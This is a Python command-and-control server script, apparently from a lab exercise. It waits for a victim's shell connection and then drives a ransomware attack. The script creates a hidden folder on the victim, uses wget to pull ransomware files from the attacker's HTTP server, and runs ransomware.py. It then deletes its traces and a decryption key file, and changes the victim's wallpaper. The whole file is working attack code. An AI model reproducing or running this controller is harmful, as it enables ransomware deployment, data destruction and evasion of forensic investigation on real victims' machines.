import os
import socket
from sys import exit

from pytz import common_timezones_set

SERVER_HOST = "192.168.62.200"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 

def send_command(command):
    client_socket.send(command.encode())
    output = client_socket.recv(BUFFER_SIZE).decode()
    if (not "getcwd" in output) and (not "Done" in output):
        print("Output:", output)

def make_folder():
    # Create a hidden folder on victim
    print("[+] Creating hidden folder .ransomware on Victim...")

    command1 = "cd /home/ubuntu/Documents"
    send_command(command1)
    
    command2 = "mkdir .ransomware"
    send_command(command2)
    

    command3 = "cd .ransomware"
    send_command(command3)


def transfer_files(rootDir):
    
    make_folder()
    # Transfer all files from Attacker directory to hidden folder on victim
    print("[+] Transferring ransomware files to the vitim...")
    # Run HTTP server on port 9000 for this to work
    cmd = 'wget 192.168.62.200:9000/Desktop/Attacker/'
    system = os.walk(rootDir, topdown=True)

    for root, dir, files in system:
        for file in files:
            command = cmd + file
            send_command(command)

def delete_files():
    print("[+] Removing all traces...")
    command = 'rm -r /home/ubuntu/Documents/.ransomware'
    send_command(command)

    command = 'rm /home/ubuntu/Desktop/Victim/dec_aesKey.txt'
    send_command(command)

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

transfer_files('/home/ubuntu/Desktop/Attacker/')

command = 'python3 ransomware.py'
print("[+] Starting ransomware....")
send_command(command)

delete_files()

command = 'gsettings set org.gnome.desktop.background picture-uri file:////usr/share/backgrounds/bye.jpg'
send_command(command)

command = "exit"
send_command(command)

client_socket.close()
s.close()
